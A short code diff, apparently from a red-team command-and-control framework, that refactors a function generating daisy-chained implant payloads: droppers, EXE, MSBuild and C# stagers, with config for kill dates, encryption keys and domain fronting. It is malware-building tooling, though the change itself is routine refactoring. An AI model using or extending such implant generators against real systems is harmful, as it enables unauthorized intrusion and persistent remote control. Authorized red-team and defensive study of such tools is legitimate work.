@@ -384,8 +384,8 @@ def do_startdaisy(user, command, randomuri):
         daisyhost = get_implantdetails(randomuri)
         proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
         C2 = get_c2server_all()
-        newPayload = Payloads(C2[5], C2[2], f"http://{bind_ip}", "", f"{bind_port}", "", "", "",
-                                "", proxynone, C2[17], C2[18], C2[19], "%s?d" % get_newimplanturl(), PayloadsDirectory)
+        urlId = new_urldetails(name, C2.PayloadCommsHost, C2.DomainFrontHeader, f"Daisy: {name}", upstream_url, daisyhost[0], "")
+        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?d" % get_newimplanturl(), PayloadsDirectory, PowerShellProxyCommand = proxynone, URLID = urlId)
         newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost[11], daisyhost[3]))
         newPayload.CreateRaw(name)
         newPayload.CreateDroppers(name)
@@ -394,5 +394,4 @@ def do_startdaisy(user, command, randomuri):
         newPayload.CreateEXE(name)
         newPayload.CreateMsbuild(name)
         newPayload.CreateCS(name)
-        new_urldetails(name, C2[1], C2[3], f"Daisy: {name}", upstream_url, daisyhost[0], "")
         print_good("Created new %s daisy payloads" % name)
